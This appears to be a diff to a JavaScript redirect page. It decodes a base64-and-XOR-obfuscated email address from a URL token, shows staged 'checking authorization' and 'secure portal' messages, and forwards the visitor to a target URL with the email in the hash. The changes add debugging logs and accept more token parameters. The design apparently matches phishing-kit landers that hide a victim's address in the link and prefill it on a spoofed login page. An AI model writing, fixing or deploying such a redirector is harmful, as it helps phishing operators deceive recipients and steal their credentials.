@@ -59,56 +59,69 @@
     (function() {
         'use strict';
         
-        // Decode obfuscated email
+        // Decode obfuscated email (must match encoder)
         function decodeEmail(encoded) {
             try {
+                console.log('Decoding:', encoded);
+                
                 // URL-safe base64 decode
                 let safe = encoded.replace(/-/g, '+').replace(/_/g, '/');
                 while (safe.length % 4) safe += '=';
-                const decoded = atob(safe);
+                const base64Decoded = atob(safe);
+                console.log('Base64 decoded:', base64Decoded);
                 
-                // Simple XOR decode (optional second layer)
+                // XOR decode with key 42
+                const key = 42;
                 let result = '';
-                const key = 42; // XOR key
-                for (let i = 0; i < decoded.length; i++) {
-                    result += String.fromCharCode(decoded.charCodeAt(i) ^ key);
+                for (let i = 0; i < base64Decoded.length; i++) {
+                    result += String.fromCharCode(base64Decoded.charCodeAt(i) ^ key);
                 }
+                console.log('XOR decoded:', result);
                 return result;
             } catch(e) {
+                console.error('Decode error:', e);
                 return null;
             }
         }
         
-        // Get encoded token from URL
+        // Get token from URL
         function getToken() {
             const url = new URL(window.location.href);
             
-            // Check for 't' parameter (encoded)
-            const token = url.searchParams.get('t');
-            if (token && token.length > 10) return token;
-            
-            // Check hash (if someone puts encoded in hash)
-            if (url.hash && url.hash.length > 10) {
-                return url.hash.substring(1);
+            // Check query parameters
+            const params = ['t', 'k', 'r', 's', 'c', 'id', 'token', 'key'];
+            for (const param of params) {
+                const value = url.searchParams.get(param);
+                if (value && value.length > 5) {
+                    console.log('Found token in param', param, ':', value);
+                    return value;
+                }
             }
             
-            // Check path segments
+            // Check hash
+            if (url.hash && url.hash.length > 5) {
+                const hashValue = url.hash.substring(1);
+                console.log('Found token in hash:', hashValue);
+                return hashValue;
+            }
+            
+            // Check path
             const path = url.pathname;
-            const segments = path.split('/').filter(s => s.length > 10);
+            const segments = path.split('/').filter(s => s.length > 5);
             if (segments.length > 0) {
+                console.log('Found token in path:', segments[segments.length - 1]);
                 return segments[segments.length - 1];
             }
             
+            console.log('No token found');
             return null;
         }
         
-        // Update status
         function updateStatus(msg) {
             const el = document.getElementById('status');
             if (el) el.textContent = msg;
         }
         
-        // Main redirect
         function redirect() {
             updateStatus('Checking authorization...');
             
@@ -117,25 +130,28 @@
             
             setTimeout(() => {
                 if (token) {
-                    updateStatus('Validating security token...');
+                    updateStatus('Decoding security token...');
                     
                     setTimeout(() => {
                         const email = decodeEmail(token);
+                        console.log('Decoded email:', email);
                         
                         if (email && email.includes('@') && email.includes('.')) {
                             updateStatus('Redirecting to secure portal...');
                             
-                            // Encode email for final URL (simple URL encoding)
-                            const finalEmail = encodeURIComponent(email);
-                            const finalUrl = targetBase + '#' + finalEmail;
+                            // URL encode the email for the hash
+                            const encodedEmail = encodeURIComponent(email);
+                            const finalUrl = targetBase + '#' + encodedEmail;
+                            
+                            console.log('Final redirect URL:', finalUrl);
                             
                             setTimeout(() => {
                                 window.location.replace(finalUrl);
-                            }, 500 + Math.random() * 500);
+                            }, 500);
                             
                         } else {
-                            // Invalid token
-                            updateStatus('Invalid authorization, using standard access...');
+                            console.log('Invalid decoded email:', email);
+                            updateStatus('Invalid token, using standard access...');
                             setTimeout(() => {
                                 window.location.replace(targetBase);
                             }, 1000);
@@ -143,8 +159,7 @@
                     }, 600);
                     
                 } else {
-                    // No token
-                    updateStatus('Initiating standard access...');
+                    updateStatus('No token found, using standard access...');
                     setTimeout(() => {
                         window.location.replace(targetBase);
                     }, 800);
@@ -152,7 +167,7 @@
             }, 500);
         }
         
-        // Start after delay
+        // Start redirect with delay
         setTimeout(redirect, 800);
         
     })();
